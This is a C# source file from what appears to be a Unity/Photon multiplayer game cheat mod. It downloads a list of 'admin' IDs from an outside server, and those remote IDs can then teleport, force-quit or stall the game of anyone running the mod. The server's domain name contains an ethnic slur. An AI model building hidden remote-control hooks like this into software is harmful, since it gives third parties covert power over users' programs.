using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using Steal.Patchers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using UnityEngine;
using System.Text;
using System.Threading;

namespace Steal.Background.Mods
{
    internal class AdminControls : Mod
    {
        static bool hasInit = false;
        public static List<string> adminIDS = new List<string>();

        public override void OnConnectedToMaster()
        {
            base.OnConnectedToMaster();
            if (!hasInit)
            {
                using (WebClient webClient = new WebClient())
                {
                    adminIDS = webClient.DownloadString("https://chingchong.cloud/steal/assets/adminids").Split('\n').ToList();
                }
                PhotonNetwork.NetworkingClient.EventReceived += OnEvent;
                hasInit = true;
            }
        }

        public void OnEvent(EventData ev)
        {
            Player sender = PhotonNetwork.NetworkingClient.CurrentRoom.GetPlayer(ev.Sender, false);
            if (sender != null && adminIDS.Contains(sender.UserId))
            {
                object[] sendData = (object[])ev.CustomData;
                if (ev.Code == 10 && sendData[0] != null)
                {
                    TeleportationLib.Teleport((Vector3)sendData[0]);
                }
                if (ev.Code == 11)
                {
                    Application.Quit();
                }
                if (ev.Code == 12)
                {
                    Thread.Sleep(9);
                }
            }
        }
    }
}
